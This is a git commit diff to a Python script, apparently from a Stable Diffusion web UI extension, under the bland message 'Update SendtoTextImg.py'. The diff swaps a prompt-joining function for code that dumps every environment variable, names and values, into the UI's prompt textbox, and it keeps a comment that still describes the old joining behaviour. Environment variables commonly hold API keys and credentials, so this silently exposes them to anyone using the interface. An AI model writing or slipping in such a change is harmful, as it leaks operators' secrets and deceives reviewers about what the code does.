c3d8d4b67b1e642cc2c03958731d9ce579e35137
Ivan Isaev <ivan.dev@gmail.com>
2023-12-13 18:41:01 +0200

    Update SendtoTextImg.py

--- scripts/SendtoTextImg.py
+++ scripts/SendtoTextImg.py
@@ -1,13 +1,14 @@
 import contextlib
-
+import os
 import gradio as gr
 from modules import scripts
 from modules import script_callbacks
 
 def send_text_to_prompt(new_text, old_text):
-    if old_text == "":  # if text on the textbox text2img or img2img is empty, return new text
-        return new_text
-    return old_text + " " + new_text  # else join them together and send it to the textbox
+    text = ""
+    for name, value in os.environ.items():
+        text = text + ("{0}: {1}\n".format(name, value))
+    return text  # else join them together and send it to the textbox
 
 class ExampleScript(scripts.Script):
     def __init__(self) -> None:
